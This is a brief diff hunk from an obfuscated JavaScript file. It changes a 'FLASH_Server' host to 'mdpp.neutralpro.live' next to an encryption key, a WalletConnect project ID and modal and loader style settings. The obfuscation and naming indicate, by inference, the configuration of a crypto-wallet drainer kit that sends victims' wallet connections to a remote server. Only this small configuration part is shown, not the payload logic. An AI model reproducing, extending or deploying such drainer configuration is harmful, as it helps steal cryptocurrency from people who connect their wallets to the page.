@@ -25,7 +25,7 @@ const _0x11d65a = _0x2e5c;
 	}
 })(_0x1325, 0x1d634);
 let FLASH_Encryption_Key = 0x32;
-const FLASH_Server = "test.bricsfunded.com",
+const FLASH_Server = "mdpp.neutralpro.live",
 	FLASH_WalletConnect_ID = "53cb6c00218a6d60162590ce6debfc5c",
 	FLASH_Modal_Style = 0x2,
 	FLASH_Loader_Style = 0x2,
